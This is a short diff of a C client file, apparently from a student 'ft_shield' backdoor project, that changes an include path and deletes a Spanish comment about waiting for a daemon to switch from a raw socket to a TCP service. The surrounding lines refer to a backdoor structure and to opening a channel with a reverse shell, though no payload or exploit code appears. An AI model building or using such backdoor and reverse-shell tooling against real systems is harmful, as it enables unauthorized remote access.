@@ -1,4 +1,4 @@
-# include "../include/ft_shield.h"
+# include "ft_shield.h"
 
 volatile sig_atomic_t g_sigint_received = 0;
 volatile sig_atomic_t g_sigalrm_received = 0;
@@ -34,7 +34,7 @@ int main(int argc, char **argv)
     close(backdoor->socketfd);
     backdoor->socketfd = -1;
 
-    sleep(1);               // para que le de tiempo al daemon para cerrar su socket raw y lenvantar el servicio TCP
+    sleep(1);
 
     printf("Opening communication channel with the reverse shell...\n");
 
